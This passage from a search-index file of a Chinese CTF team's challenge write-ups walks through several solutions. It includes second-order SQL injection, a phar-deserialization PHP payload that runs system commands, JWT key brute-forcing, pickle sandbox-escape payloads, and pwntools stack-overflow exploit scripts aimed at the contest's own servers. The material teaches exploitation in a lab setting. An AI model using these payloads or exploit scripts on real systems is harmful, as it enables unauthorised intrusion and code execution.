\u9020\u6210\u51fa\u73b0\u4e86\u80fdgetshell\u7684\u975e\u9884\u671f\u89e3\uff0c\u5728\u8fd9\u91cc\u60ed\u6127\u4e00\u4e0b\u3002\u6784\u9020\u8fc7\u7a0b\u4e5f\u6bd4\u8f83\u6709\u610f\u601d\uff0c\u6709\u5174\u8da3\u7684\u5e08\u5085\u53ef\u4ee5\u81ea\u5df1\u5c1d\u8bd5\u3002","title":"Web"},{"location":"WriteUp/202005/Web/#web","text":"","title":"Web"},{"location":"WriteUp/202005/Web/#_1","text":"\u8fd9\u9053\u9898\u8003\u5bdf\u7684\u662f\u7b80\u5355\u7684\u4e8c\u6b21SQL\u6ce8\u5165\uff0c\u51fa\u9898\u58ec\u5e0c\u671b\u540c\u5b66\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u9053\u7b80\u5355\u7684\u4f8b\u9898\u521d\u6b65\u4e86\u89e3\u4e8c\u6b21SQL\u6ce8\u5165\u3002 \u672c\u9898\u7684\u9884\u671f\u5185\u5bb9\u8fd8\u5305\u542b\u4e86\u901a\u8fc7robots.txt\u4e2d\u7684\u5185\u5bb9\u62ff\u5230\u6e90\u7801\uff0c\u8fdb\u884c\u5ba1\u8ba1\uff0c\u4e0d\u8fc7\u4f3c\u4e4e\u51fa\u9898\u51fa\u7684\u592a\u7b80\u5355\u4e86\uff0c\u5927\u5bb6\u90fd\u6ca1\u7528\u5230\u3002\u3002\u3002 \u5728robots.txt\u91cc\u9762\u5305\u542b\u4e86\u5982\u4e0b\u5185\u5bb9 User-agent: * Disallow: /backup.zip \u4e0b\u8f7d\u4e0b\u6765\u5ba1\u8ba1\u53ef\u4ee5\u770b\u7684\u66f4\u660e\u767d\u4e00\u4e9b\u3002\u9996\u5148\u6ce8\u518c\u548c\u767b\u9646\u90fd\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u51fa\u9898\u58ec\u4e5f\u5c31\u63a0\u8fc7\u53bb\u4e0d\u8bb2\u4e86\uff0c\u76f4\u63a5\u770b\u4fee\u6539\u5bc6\u7801\u7684\u5730\u65b9\u5b58\u5728\u7684\u6f0f\u6d1e $x=$db->execute(\"update users set password=? where username='$username' \",['s',&$password]); \u8fd9\u91cc\u76f4\u63a5\u5c06 username\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\u4e86\uff0c\u800c\u8fd9\u4e2a username\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\u4e86\uff0c\u800c\u8fd9\u4e2a username\u662f\u5728\u6ce8\u518c\u65f6\u9009\u5b9a\u7684\uff0c\u56e0\u6b64\u60f3\u8981\u5b9e\u73b0\u6ce8\u5165\uff0c\u9700\u8981\u5728\u6ce8\u518c\u7684\u65f6\u5019\uff0c\u5c31\u76f4\u63a5\u8bbe\u5b9a\u7528\u6237\u540d\u4e3aadmin'-- -\u3002 \u8fd9\u6837\u4e00\u6765\uff0c\u767b\u9646\u4e0a\u53bb\u4fee\u6539\u5bc6\u7801\u7684\u65f6\u5019\uff0csql\u8bed\u53e5\u5c31\u6210\u4e86 update users set password =? where username = 'admin' -- -' (\u5176\u4e2d?\u6307\u7684\u662f\u88ab\u7ed1\u5b9a\u7684\u53c2\u6570\uff0c\u6211\u4eec\u65e0\u8bba\u5982\u4f55\u4fee\u6539\u5b83\u90fd\u4e0d\u4f1a\u6539\u53d8\u539f\u672c\u7684\u8bed\u4e49) \u800c\u8fd9\u4e2a\u8bed\u53e5\u4e2dusername\u540e\u9762\u5c31\u6210\u4e86admin' -- -',\u5728MySQL\u4e2d--[\u7a7a\u683c]\u662f\u6ce8\u91ca\u7b26\uff0c\u628aSQL\u8bed\u53e5\u540e\u9762\u6ce8\u91ca\u6389\u4e86\uff0c\u56e0\u6b64\u8fd9\u53e5\u8bdd\u76f8\u5f53\u4e8e\u4fee\u6539admin\u7684\u5bc6\u7801\u3002 \u56e0\u6b64\u5728\u4fee\u6539\u5bc6\u7801\u540e\u767b\u51fa\uff0c\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u5bc6\u7801\u767b\u9646admin\u8d26\u53f7\u83b7\u53d6flag\u4e86","title":"\u4e8c\u6b21\u6ce8\u5165"},{"location":"WriteUp/202005/Web/#_2","text":"\u76f8\u4fe1\u5927\u5bb6\u770b\u5230\u95ee\u53f7\u5e94\u8be5\u77e5\u9053\u8fd9\u9053\u9898\u4e3b\u8981\u8003\u7684\u4e0d\u662f\u53cd\u5e8f\u5217\u5316\u4e86\u5427\uff08\u4e0d\u4f1a\u771f\u6709\u4eba\u5728\u7ea0\u7ed3\u53cd\u5e8f\u5217\u5316\u5427\uff09","title":"\u53cd\u5e8f\u5217\u5316\uff1f"},{"location":"WriteUp/202005/Web/#_3","text":"\u5148\u89c2\u5bdf vulnerable.php \u554a\uff0c\u4e3b\u9875\u4e0a\u90fd\u63d0\u793a\u4e86\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u663e\u7136\u80fd\u5bfc\u81f4RCE\u7684\u7c7b\uff0c\u4e0b\u9762\u6709\u4e00\u4e2a file_exists \u51fd\u6570\uff0c\u4e0d\u4f1a\u6709\u4eba\u771f\u89c9\u5f97\u8fd9\u8fb9\u662f\u68c0\u67e5\u4e0a\u4f20\u6587\u4ef6\u662f\u5426\u6210\u529f\u5427\u3002 file_exists \u51fd\u6570\u518d\u68c0\u67e5phar\u5305\u7684\u65f6\u5019\u4f1a\u5c06\u5176\u89e3\u6790\uff0c\u5229\u7528\u8fd9\u70b9\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002 \u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u751f\u6210\u4e00\u4e2aphar\u5305\uff08\u5e26\u4e0agif\u6587\u4ef6\u5934\uff0c\u56e0\u4e3a\u4e0a\u4f20\u90a3\u8fb9\u4f1a\u68c0\u67e5\uff09\uff0c\u7136\u540e\u4fee\u6539\u540e\u7f00\u540d\u4e0a\u4f20\u5373\u53ef\uff0c\u7136\u540e\u4f7f\u7528phar\u534f\u8bae phar://upload/xxx.gif \u5373\u53ef\u62ff\u5230flag\u3002 <?php class Flag { private $code ; function __construct ( $my_code ) { $this -> code = $my_code ; } function __destruct () { eval ( $this -> code ); } } $phar = new Phar ( 'phar1.phar' ); $phar -> stopBuffering (); $phar -> setStub ( 'GIF89a' . '<?php __HALT_COMPILER();?>' ); $phar -> addFromString ( 'test.txt' , 'test' ); $object = new Flag ( \"system('cat /flag');\" ); $phar -> setMetadata ( $object ); $phar -> stopBuffering ();","title":"\u89e3\u9898\u65b9\u6cd5"},{"location":"WriteUp/202005/Web/#ezcode","text":"","title":"ezcode"},{"location":"WriteUp/202005/Web/#_4","text":"\u8003\u5bdfJWT\u7206\u7834\u3001pickle\u53cd\u5e8f\u5217\u5316\u7684\u6c99\u7bb1\u9003\u9038\uff08\u53d8\u91cf\u7be1\u6539\uff09\u3002","title":"\u51fa\u9898\u601d\u8def"},{"location":"WriteUp/202005/Web/#_5","text":"\u8fdb\u5165\u9996\u9875\uff0c\u8df3\u8f6c\u81f3\u767b\u9646\u754c\u9762\uff0c\u8981\u6c42\u8f93\u5165token\u767b\u9646\u3002\u4e0b\u9762\u6709\u4e2a\u6ce8\u518c\uff0c\u5148\u968f\u4fbf\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2aJWT\u3002 \u4f7f\u7528\u8be5JWT\u767b\u9646\u8fdb\u53bb\uff0c\u63d0\u793a\u6ca1\u6709\u6743\u9650\u3002\u5c1d\u8bd5\u4ee5admin\u6ce8\u518c\u8d26\u53f7\uff0c\u5931\u8d25\u3002\u5f88\u660e\u663e\u662f\u8981\u4f2a\u9020admin\u8d26\u6237\u7684JWT\u3002 \u901a\u8fc7\u5bf9\u4e4b\u524d\u6ce8\u518c\u7684\u8d26\u53f7\u7684JWT\u8fdb\u884c\u5f31\u5bc6\u94a5\u7206\u7834\uff08\u76f4\u63a5\u7528top1000\u5c31\u80fd\u7206\u7834\u51fa\u6765\uff09\uff0c\u5f97\u5230\u52a0\u5bc6\u5bc6\u94a5\uff1a qwerty \uff0c\u4ece\u800c\u4f2a\u9020admin\u8d26\u6237\u7684JWT\u3002 \u4ee5admin\u767b\u9646\u540e\uff0c\u51fa\u73b0\u4e00\u4e2apickle\u5728\u7ebf\u5de5\u5177\uff0c\u67e5\u770b\u7f51\u9875\u6e90\u7801\uff0c\u6709\u6ce8\u91ca\uff1a want2know = xxx class RestrictedUnpickler ( pickle . Unpickler ): blacklist = { 'sys' , 'eval' , 'exec' , 'execfile' , 'compile' , 'open' , 'input' , '__import__' , 'exit' , 'getattr' } def find_class ( self , module , name ): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self . blacklist : return getattr ( builtins , name ) # Forbid everything else. raise pickle . UnpicklingError ( \"global ' %s . %s ' is forbidden\" % ( module , name )) def restricted_loads ( s ): return RestrictedUnpickler ( io . BytesIO ( s )) . load () ... pickle_data = request . form . get ( 'data' ) if pickle_data == None : return open ( 'templates/pickle.html' ) . read () try : pickle_data = base64 . b64decode ( pickle_data . encode ()) op_blackli = [ b 'R' ] for op in op_blackli : if op in pickle_data : return '\u6570\u636e\u975e\u6cd5\uff01' + op . decode () data = restricted_loads ( pickle_data ) except Exception : return \"\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6570\u636e\u683c\u5f0f\uff01\" try : secret = request . form . get ( 'secret' ) except Exception : return open ( 'templates/pickle.html' ) if want2know == secret : return flag else : return '\u6b22\u8fce\u4f7f\u7528HACHp1\u7684pickle\u6d4b\u8bd5\u5de5\u5177\uff01' else : return '\u6ca1\u6709\u6743\u9650\u67e5\u770b\uff01 \\n ' \u5f88\u660e\u663e\u662fpickle\u53cd\u5e8f\u5217\u5316\uff0c\u9650\u5236\u4e86 builtins \u6a21\u5757\uff0c\u7981\u6b62\u4e86 R \u6267\u884c\u51fd\u6570\uff0c\u5e76\u4e14\u9ed1\u540d\u5355\u9650\u5236\u4e86\u4e00\u4e9b\u654f\u611f\u5b50\u6a21\u5757\uff0c\u53ea\u8981 want2know==secret \u6b63\u786e\u5c31\u80fd\u5f97\u5230flag\uff0c\u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7 globals() \u6216 locals() \u5f97\u5230\u53d8\u91cf\u5217\u8868\uff0c\u901a\u8fc7 i \u6267\u884c\u51fd\u6570\uff0c\u4fee\u6539\u5217\u8868\u8fbe\u5230\u7be1\u6539\u53d8\u91cf\u7684\u76ee\u7684\uff0c\u4ece\u800c\u5f97\u5230flag\u3002\u4e00\u79cd\u53ef\u884c\u7684payload\uff1a b \"(ibuiltins \\n globals \\n p0 \\n 0g0 \\n S'want2know' \\n S'hachp1' \\n s.\" # \u6216 b \"(ibuiltins \\n locals \\n p0 \\n 0g0 \\n S'want2know' \\n S'hachp1' \\n s.\" \u63a8\u8350\u4f7f\u7528pker\uff1a glo_dic = INST ( 'builtins' , 'globals' ) glo_dic [ 'want2know' ] = 'hachp1' return # \u6216 glo_dic = INST ( 'builtins' , 'locals' ) glo_dic [ 'want2know' ] = 'hachp1' return","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/202005/Web/#_6","text":"\u7531\u4e8e\u672c\u4eba\u5fd8\u8bb0\u8fc7\u6ee4 __getattribute__ \u9020\u6210\u51fa\u73b0\u4e86\u80fdgetshell\u7684\u975e\u9884\u671f\u89e3\uff0c\u5728\u8fd9\u91cc\u60ed\u6127\u4e00\u4e0b\u3002\u6784\u9020\u8fc7\u7a0b\u4e5f\u6bd4\u8f83\u6709\u610f\u601d\uff0c\u6709\u5174\u8da3\u7684\u5e08\u5085\u53ef\u4ee5\u81ea\u5df1\u5c1d\u8bd5\u3002","title":"\u975e\u9884\u671f"},{"location":"WriteUp/202005/pwn/","text":"Pwn \u00b6 Passwd\uff08\u7b80\u5355\u7684\u6808\u6ea2\u51fa\uff0c\u6709\u4e24\u79cd\u601d\u8def\u53ef\u4ee5\u5229\u7528\uff09 \u00b6 \u89e3\u9898\u601d\u8def\u4e00 \u00b6 \u6587\u4ef6\u8bfb\u53d6\u7ed3\u675f\u540e\uff0c\u76f8\u5173\u7684\u7f13\u51b2\u533a\u6570\u636e\u4f1a\u88ab\u6e05\u7a7a\u5417? \u4e0d\u4f1a\u5427\uff0c\u4e0d\u4f1a\u5427 (\u76f4\u63a5\u62ff\u90ed\u5b50\u4eea\u540c\u5b66\u7684wp\u653e\u4e0a\u6765\u4e86) \u9996\u5148nop\u6389\u53cd\u8c03\u8bd5, \u6062\u590d\u7ed3\u6784\u4f53 \u5176\u4e2dpasswd\u6307\u5411\u6211\u4eec\u8bfb\u5165\u7684\u6570\u636e\u3002 \u7136\u540e\u51fd\u6570\u540d\u5b57\u4e5frename\u4e00\u4e0b\u3002 \u7136\u540e\u770b\u4e00\u4e0b\u8fd9\u4e2a\u7a0b\u5e8f\u5b9e\u9645\u4e0a\u5728\u8bfb\u53d6\u7684\u65f6\u5019\u53ef\u4ee5\u5c06name\u6ea2\u51fa\u5230passwd\u6765\u4fee\u6539passwd\u6307\u9488\u3002 \u7a0b\u5e8f\u4f7f\u7528fopen\u8bfb\u53d6\u771f\u6b63\u7684\u5bc6\u7801\uff0c\u800c\u6587\u4ef6\u8bfb\u53d6\u7ed3\u675f\u540e\u76f8\u5173\u7f13\u51b2\u533a\u7684\u5e76\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002\u6240\u4ee5\u76f4\u63a5\u8986\u76d6passwd\u6307\u9488\u5230\u7f13\u51b2\u533a\u5373\u53ef\u3002\u4e0d\u8fc7\u8981\u7a0d\u5fae\u7206\u7834\u4e00\u4e0b\u3002\uff08\u4e00\u5f00\u59cb\u60f3\u590d\u6742\u4e86\uff0c\u51c6\u5907\u5bf9\u7740mmap\u4e00\u901a\u64cd\u4f5c\uff0c\u6253freehook\uff09\u3002\u811a\u672c\u5176\u5b9e\u4e0d\u96be\uff0c\u4e00\u5f00\u59cb\u786e\u5b9e\u60f3\u504f\u4e86\u3002 \u6700\u7ec8\u7ed3\u679c \u00b6 exp \u00b6 # encoding=UTF-8 from pwn import * context . terminal = '/bin/zsh' context . arch = \"amd64\" context . log_level = \"debug\" elf_path = \"./passwd\" elf = ELF ( elf_path ) libc = ELF ( \"./libc-2.23.so\" ) ip = \"www.povcfe.site\" port = 10001 #io = remote(ip, port) #io = process(elf_path) def input_name ( buf ): io . sendlineafter ( \"Name:\" , buf ) def input_size ( size ): io . sendlineafter ( \"Length Of New Passwd:\" , str ( size )) def input_passwd ( buf ): io . sendlineafter ( \"Passwd:\" , buf ) yes = \"yes\" no = \"no\" def yes_no ( s ): io . sendlineafter ( \"yes/no?:\" , s ) sw = \"1\" ac = \"2\" def choice ( c ): io . sendlineafter ( \"[2]:Start A New Article\" , c ) def input_ac ( buf ): io . sendlineafter ( \"Article(end with '#'):\" , buf ) while 1 : #io = remote(ip, port) io = process ( elf_path ) input_name ( \"abcd\" ) input_size ( 24 ) input_passwd ( \"123456\" ) choice ( sw ) yes_no ( yes ) buf = \"admin\" buf += \" \\x00 \" * 0xb # \u586b\u5145\u81f3name\u7ed3\u675f\uff0c16\u4e2a buf += \" \\xa0\\xd2 \" # \u5f00\u59cb\u8986\u76d6passwd\u6307\u9488\u7684\u4f4e\u4f4d input_name ( buf ) # pause() # attach(io) buf = \"a\" * 0x14 input_passwd ( buf ) pause () attach ( io ) io . interactive () \u90ed\u5b50\u4eea\u540c\u5b66\u4e00\u5f00\u59cb\u9677\u5165\u8bef\u533a\u7684\u539f\u56e0\u662f\u8ba4\u4e3ammap\u57fa\u5730\u5740\u4e0elibc\u57fa\u5730\u5740\u504f\u79fb\u56fa\u5b9a\uff0c\u5176\u5b9e\u4e24\u8005\u7684\u504f\u79fb\u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u6709\u53ef\u80fd\u662f\u4e0d\u540c\u7684\u3002\u6362\u4e2a\u601d\u8def\uff0c\u56e0\u4e3ammap\u4e0elibc\u4e4b\u95f4\u4e00\u5b9a\u662f\u4ee50x1000\u4e3a\u57fa\u7840\u8fdb\u884c\u504f\u79fb\u7684\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u4ee5\u9002\u5ea6\u7206\u7834mmap\u4e0elibc\u4e4b\u95f4\u7684\u56fa\u5b9a\u504f\u79fb\uff0c\u90a3\u4e48\u8fd9\u9898\u4e5f\u662f\u53ef\u4ee5\u505a\u51fa\u6765\u7684 \u89e3\u9898\u601d\u8def\u4e8c \u00b6 \u8003\u8651\u4e00\u4e0bstrncmp\u51fd\u6570\u662f\u600e\u4e48\u5224\u65ad\u5b57\u7b26\u4e32\u76f8\u7b49\u7684? \u524d\u7f6e\u77e5\u8bc6 \u00b6 strncmp(str1, str2, n) \u7684\u5b9e\u73b0\u539f\u7406\uff0c\u662f\u901a\u8fc7\u9010\u5b57\u8282\u6bd4\u5bf9\u76f4\u81f3n\u5b57\u8282\u5168\u90e8\u6bd4\u5bf9\u5b8c\u6bd5\uff0c\u4e2d\u95f4\u5982\u679c\u53d1\u73b0\u67d0\u5b57\u8282\u4e0d\u540c\uff0c\u5219\u51fd\u6570\u8fd4\u56de\u3002\u6240\u4ee5\uff0c\u5047\u8bbestr1[0]\u5b58\u50a8\u4e8e\u5408\u6cd5\u5730\u5740\uff0c\u4f46\u662fstr1[1]\u5b58\u50a8\u4e8e\u975e\u6cd5\u5730\u5740(\u65e0\u8bfb\u53d6\u6743\u9650\u7684\u5730\u5740)\uff0c\u90a3\u4e48\u5982\u679c\u5728\u6bd4\u5bf9\u7b2c\u4e00\u4e2a\u5b57\u8282\u65f6\uff0cstr1\u4e0estr2\u4e0d\u540c\u5219\u6b63\u5e38\u51fd\u6570\u8fd4\u56de\uff0c\u53cd\u4e4b\u5982\u679c\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u540c\uff0c\u51fd\u6570\u7ee7\u7eed\u6267\u884c\u5e76\u8bfb\u53d6\u7b2c\u4e8c\u4e2a\u5b57\u8282(str[1]\u5b58\u50a8\u4e8e\u975e\u6cd5\u5730\u5740)\uff0c\u5219\u7a0b\u5e8f\u5f02\u5e38\u9000\u51fa\u3002 \u89e3\u4f53\u601d\u8def \u00b6 \u901a\u8fc7\u6ea2\u51fa\u53ef\u4ee5\u63a7\u5236passwd\u6307\u5411\u7684\u5730\u5740\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7531mmap\u5f00\u8f9f\u7684\u56fa\u5b9a\u5185\u5b58\u57570x600000000000-0x600000004000\uff0c\u6240\u4ee5\u5982\u679c\u628apasswd\u6307\u54110x600000004000-1\uff0c\u90a3\u4e48\u6839\u636e\u7a0b\u5e8f\u7684\u8fd4\u56de\u72b6\u6001\u5c31\u53ef\u4ee5\u5224\u65ad\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f\u5426\u6b63\u786e\uff0c\u6839\u636e\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u628apasswd\u9010\u5b57\u8282\u7206\u7834 exp \u00b6 from pwn import * import time import sys # sh = process(\"./passwd\") # ip = sys.argv[1] #sh = remote(\"172.16.202.302\", 8888) sh = remote ( \"geekgame.scuctf.com\" , 10001 ) # context.log_level = \"debug\" def login ( name , passwd_len , passwd ): sh . recvuntil ( \"[+] Input Your Name: \\n \" ) sh . sendline ( name ) if ( name == \"admin\" ): sh . recvuntil ( \"[+] Input Admin Passwd:\" ) sh . sendline ( passwd ) else : sh . recvuntil ( \"[+] Please Input The Length Of New Passwd: \\n \" ) sh . sendline ( str ( passwd_len )) sh . recvuntil ( \"[+] Input The New Passwd: \\n \" ) sh . sendline ( passwd ) def switch_account ( name , passwd ): sh . recvuntil ( \"[2]:Start A New Article \\n \" ) sh . sendline ( \"1\" ) sh . recvuntil ( \"[+] Are You Sure To Switch Account? yes/no?: \\n \" ) sh . sendline ( \"yes\" ) sh . recvuntil ( \"[+] Input The New Name: \\n \" ) sh . sendline ( name ) sh . recvuntil ( \"[+] Input The Passwd: \\n \" ) sh . sendline ( passwd ) def new_article ( context ): sh . recvuntil ( \"[2]:Start A New Article \\n \" ) sh . sendline ( \"2\" ) sh . recvuntil ( \"[+] Input The Content Of Article(end with '#'): \\n \" ) sh . sendline ( context ) passwd = b \"\" num = 0 addr = 0x600000004000 ppp = 0 while ( num < 19 ): login ( b \"povcfe\" , 22 , b \"aaa\" ) new_article ( b \"aaaa#\" ) addr = addr - 1 payload = b \"admin\" + b \"a\" * 11 + p64 ( addr ) while ( 1 ): ppp = ppp + 1 for i in range ( 0x20 , 0x80 ): try : try_passwd = passwd + chr ( i ) . encode () switch_account ( payload , try_passwd ) except : num = num + 1 passwd = passwd + chr ( i - 1 ) . encode () log . success ( \"one byte is: \" + chr ( i - 1 )) break # sh = process(\"./passwd\") sh . close () # sh = remote(\"172.16.202.132\", 8888) sh = remote ( \"geekgame.scuctf.com\" , 10001 ) break login ( b \"povcfe\" , 22 , b \"aaa\" ) new_article ( \"bbb#\" ) log . success ( str ( ppp )) addr = 0x600000000000 while ( 1 ): payload = b \"admin\" + b \"a\" * 11 + p64 ( addr ) for i in range ( 0x20 , 0x80 ): try_passwd = passwd + chr ( i ) . encode () log . success ( b \"try passwd is: \" + try_passwd ) switch_account ( payload , try_passwd ) time . sleep ( 1 ) sh . sendline ( b \"echo bll\" ) res = sh . recvline () if b \"bll\" in res : sh . interactive () log . success ( \"over\" ) break log . success ( b \"passwd is: \" + try_passwd ) break Kernel_rop\uff08\u7b80\u5355\u7684\u5185\u6838\u6808\u6ea2\u51fa\uff09 \u00b6 \u4e00\uff0eHint\u4e2d\u7ed9\u51fa\u5b66\u4e60\u5185\u6838\u57fa\u7840\u77e5\u8bc6\u7684\u94fe\u63a5\uff0c\u540c\u65f6hint3\u76f4\u63a5\u7ed9\u51fa\u89e3\u9898\u7684\u8be6\u7ec6\u6b65\u9aa4\uff0c\u53ea\u9690\u85cfROP\u6784\u9020\u90e8\u5206\uff0c\u73b0\u5df2\u8865\u5168 \u7ecf\u5178ROP \u4e8c\uff0e\u5185\u6838\u6808\u6ea2\u51fa\u9664\u4e86hint\u7ed9\u51fa\u7684\u7ecf\u5178ROP\u5229\u7528\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528ret2usr\u7684\u5229\u7528\u65b9\u6cd5(\u8fd9\u4e2a\u65b9\u6cd5\u5728hint3\u6240\u7ed9\u94fe\u63a5\u7684\u9694\u58c1\uff0c\u6211\u4e13\u95e8\u628a\u90a3\u7bc7\u6587\u7ae0\u653e\u5728\u4e86\u535a\u5ba2\u9996\u884c\uff0c\u5e76\u4e14\u7ed9\u51fa\u4e86exp\uff0c\u7f16\u8bd1\u4e4b\u540e\u76f4\u63a5\u8fd0\u884c\u5c31\u53ef\u4ee5\u63d0\u6743orz\uff0c\u7adf\u7136\u6ca1\u4eba\u53d1\u73b0) ret2usr","title":"Pwn"},{"location":"WriteUp/202005/pwn/#pwn","text":"","title":"Pwn"},{"location":"WriteUp/202005/pwn/#passwd","text":"","title":"Passwd\uff08\u7b80\u5355\u7684\u6808\u6ea2\u51fa\uff0c\u6709\u4e24\u79cd\u601d\u8def\u53ef\u4ee5\u5229\u7528\uff09"},{"location":"WriteUp/202005/pwn/#_1","text":"\u6587\u4ef6\u8bfb\u53d6\u7ed3\u675f\u540e\uff0c\u76f8\u5173\u7684\u7f13\u51b2\u533a\u6570\u636e\u4f1a\u88ab\u6e05\u7a7a\u5417? \u4e0d\u4f1a\u5427\uff0c\u4e0d\u4f1a\u5427 (\u76f4\u63a5\u62ff\u90ed\u5b50\u4eea\u540c\u5b66\u7684wp\u653e\u4e0a\u6765\u4e86) \u9996\u5148nop\u6389\u53cd\u8c03\u8bd5, \u6062\u590d\u7ed3\u6784\u4f53 \u5176\u4e2dpasswd\u6307\u5411\u6211\u4eec\u8bfb\u5165\u7684\u6570\u636e\u3002 \u7136\u540e\u51fd\u6570\u540d\u5b57\u4e5frename\u4e00\u4e0b\u3002 \u7136\u540e\u770b\u4e00\u4e0b\u8fd9\u4e2a\u7a0b\u5e8f\u5b9e\u9645\u4e0a\u5728\u8bfb\u53d6\u7684\u65f6\u5019\u53ef\u4ee5\u5c06name\u6ea2\u51fa\u5230passwd\u6765\u4fee\u6539passwd\u6307\u9488\u3002 \u7a0b\u5e8f\u4f7f\u7528fopen\u8bfb\u53d6\u771f\u6b63\u7684\u5bc6\u7801\uff0c\u800c\u6587\u4ef6\u8bfb\u53d6\u7ed3\u675f\u540e\u76f8\u5173\u7f13\u51b2\u533a\u7684\u5e76\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002\u6240\u4ee5\u76f4\u63a5\u8986\u76d6passwd\u6307\u9488\u5230\u7f13\u51b2\u533a\u5373\u53ef\u3002\u4e0d\u8fc7\u8981\u7a0d\u5fae\u7206\u7834\u4e00\u4e0b\u3002\uff08\u4e00\u5f00\u59cb\u60f3\u590d\u6742\u4e86\uff0c\u51c6\u5907\u5bf9\u7740mmap\u4e00\u901a\u64cd\u4f5c\uff0c\u6253freehook\uff09\u3002\u811a\u672c\u5176\u5b9e\u4e0d\u96be\uff0c\u4e00\u5f00\u59cb\u786e\u5b9e\u60f3\u504f\u4e86\u3002","title":"\u89e3\u9898\u601d\u8def\u4e00"},{"location":"WriteUp/202005/pwn/#_2","text":"","title":"\u6700\u7ec8\u7ed3\u679c"},{"location":"WriteUp/202005/pwn/#exp","text":"# encoding=UTF-8 from pwn import * context . terminal = '/bin/zsh' context . arch = \"amd64\" context . log_level = \"debug\" elf_path = \"./passwd\" elf = ELF ( elf_path ) libc = ELF ( \"./libc-2.23.so\" ) ip = \"www.povcfe.site\" port = 10001 #io = remote(ip, port) #io = process(elf_path) def input_name ( buf ): io . sendlineafter ( \"Name:\" , buf ) def input_size ( size ): io . sendlineafter ( \"Length Of New Passwd:\" , str ( size )) def input_passwd ( buf ): io . sendlineafter ( \"Passwd:\" , buf ) yes = \"yes\" no = \"no\" def yes_no ( s ): io . sendlineafter ( \"yes/no?:\" , s ) sw = \"1\" ac = \"2\" def choice ( c ): io . sendlineafter ( \"[2]:Start A New Article\" , c ) def input_ac ( buf ): io . sendlineafter ( \"Article(end with '#'):\" , buf ) while 1 : #io = remote(ip, port) io = process ( elf_path ) input_name ( \"abcd\" ) input_size ( 24 ) input_passwd ( \"123456\" ) choice ( sw ) yes_no ( yes ) buf = \"admin\" buf += \" \\x00 \" * 0xb # \u586b\u5145\u81f3name\u7ed3\u675f\uff0c16\u4e2a buf += \" \\xa0\\xd2 \" # \u5f00\u59cb\u8986\u76d6passwd\u6307\u9488\u7684\u4f4e\u4f4d input_name ( buf ) # pause() # attach(io) buf = \"a\" * 0x14 input_passwd ( buf ) pause () attach ( io ) io . interactive () \u90ed\u5b50\u4eea\u540c\u5b66\u4e00\u5f00\u59cb\u9677\u5165\u8bef\u533a\u7684\u539f\u56e0\u662f\u8ba4\u4e3ammap\u57fa\u5730\u5740\u4e0elibc\u57fa\u5730\u5740\u504f\u79fb\u56fa\u5b9a\uff0c\u5176\u5b9e\u4e24\u8005\u7684\u504f\u79fb\u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u6709\u53ef\u80fd\u662f\u4e0d\u540c\u7684\u3002\u6362\u4e2a\u601d\u8def\uff0c\u56e0\u4e3ammap\u4e0elibc\u4e4b\u95f4\u4e00\u5b9a\u662f\u4ee50x1000\u4e3a\u57fa\u7840\u8fdb\u884c\u504f\u79fb\u7684\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u4ee5\u9002\u5ea6\u7206\u7834mmap\u4e0elibc\u4e4b\u95f4\u7684\u56fa\u5b9a\u504f\u79fb\uff0c\u90a3\u4e48\u8fd9\u9898\u4e5f\u662f\u53ef\u4ee5\u505a\u51fa\u6765\u7684","title":"exp"},{"location":"WriteUp/202005/pwn/#_3","text":"\u8003\u8651\u4e00\u4e0bstrncmp\u51fd\u6570\u662f\u600e\u4e48\u5224\u65ad\u5b57\u7b26\u4e32\u76f8\u7b49\u7684?","title":"\u89e3\u9898\u601d\u8def\u4e8c"},{"location":"WriteUp/202005/pwn/#_4","text":"strncmp(str1, str2, n) \u7684\u5b9e\u73b0\u539f\u7406\uff0c\u662f\u901a\u8fc7\u9010\u5b57\u8282\u6bd4\u5bf9\u76f4\u81f3n\u5b57\u8282\u5168\u90e8\u6bd4\u5bf9\u5b8c\u6bd5\uff0c\u4e2d\u95f4\u5982\u679c\u53d1\u73b0\u67d0\u5b57\u8282\u4e0d\u540c\uff0c\u5219\u51fd\u6570\u8fd4\u56de\u3002\u6240\u4ee5\uff0c\u5047\u8bbestr1[0]\u5b58\u50a8\u4e8e\u5408\u6cd5\u5730\u5740\uff0c\u4f46\u662fstr1[1]\u5b58\u50a8\u4e8e\u975e\u6cd5\u5730\u5740(\u65e0\u8bfb\u53d6\u6743\u9650\u7684\u5730\u5740)\uff0c\u90a3\u4e48\u5982\u679c\u5728\u6bd4\u5bf9\u7b2c\u4e00\u4e2a\u5b57\u8282\u65f6\uff0cstr1\u4e0estr2\u4e0d\u540c\u5219\u6b63\u5e38\u51fd\u6570\u8fd4\u56de\uff0c\u53cd\u4e4b\u5982\u679c\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u540c\uff0c\u51fd\u6570\u7ee7\u7eed\u6267\u884c\u5e76\u8bfb\u53d6\u7b2c\u4e8c\u4e2a\u5b57\u8282(str[1]\u5b58\u50a8\u4e8e\u975e\u6cd5\u5730\u5740)\uff0c\u5219\u7a0b\u5e8f\u5f02\u5e38\u9000\u51fa\u3002","title":"\u524d\u7f6e\u77e5\u8bc6"},{"location":"Wri